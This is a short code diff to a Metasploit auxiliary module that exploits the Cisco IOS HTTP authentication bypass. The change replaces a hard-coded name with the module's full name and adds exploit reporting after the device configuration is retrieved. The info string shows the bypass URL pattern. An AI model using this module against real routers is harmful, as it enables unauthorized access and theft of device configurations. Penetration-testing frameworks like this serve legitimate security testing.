@@ -64,7 +64,7 @@ class Metasploit3 < Msf::Auxiliary
 						:host	=> rhost,
 						:port	=> rport,
 						:proto  => 'tcp',
-						:name	=> 'IOS-HTTP-AUTH-BYPASS',
+						:name	=> self.fullname,
 						:info	=> "http://#{rhost}:#{rport}/level/#{level}/exec/show/version/CR",
 						:refs   => self.references
 					}
@@ -79,6 +79,13 @@ class Metasploit3 < Msf::Auxiliary
 					config = $2.strip
 					print_good("#{rhost}:#{rport} Processing the configuration file...")
 					cisco_ios_config_eater(rhost, rport, config)
+					report_exploit(
+						{
+							:host		=> rhost,
+							:service	=> rport,
+							:name		=> self.fullname
+						}
+					)
 				else
 					print_error("#{rhost}:#{rport} Error: could not retrieve the IOS configuration")
 				end
